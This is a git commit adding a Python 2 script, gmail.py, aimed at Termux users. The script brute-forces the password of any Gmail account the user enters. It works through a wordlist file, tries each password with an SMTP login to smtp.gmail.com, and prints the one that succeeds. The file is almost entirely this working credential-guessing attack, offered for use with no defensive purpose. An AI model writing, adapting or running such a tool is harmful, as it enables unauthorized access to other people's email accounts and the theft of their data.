2dc3448ac2192b83bbbf593537d7dcbc616cc9e0
X FO110W <51858432+xfo110w@users.noreply.github.com>
2020-08-31 16:58:22 +0700

    Add files via upload

---
+++ gmail.py
@@ -0,0 +1,47 @@
+#code command import 
+import smtplib
+import os,sys,time
+#DateTime 
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+#code
+os.system("clear")
+os.system ("termux-setup-storage")
+print
+print"    \      oo "
+print"     \____|\mm  Welcome Master"
+print"     //_//\ \_\ "
+print"    /V.2/   \/_/ "
+print"   /___/_____\ "
+print"------------------ "
+print" Code - FO110W -4"
+print" Group - FO110W "
+print
+smtpserver = smtplib.SMTP("smtp.gmail.com" , 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+print
+print"[+]> Enter Gmail to Brute Force "
+user = raw_input(" Email : ")
+os.system("clear")
+print"[+]> Enter where your Wordlist files are stored "
+passF = raw_input(" Wordlist  : ")
+passF = open(passF, "r")
+os.system("clear")
+
+for password in passF:
+
+
+        try:
+
+                smtpserver.login(user, password)
+                print ("Password : %s" % password)
+                break;
+
+        except smtplib.SMTPAuthenticationError:
+                print("\033[1;91m[+]> Not Found \033")
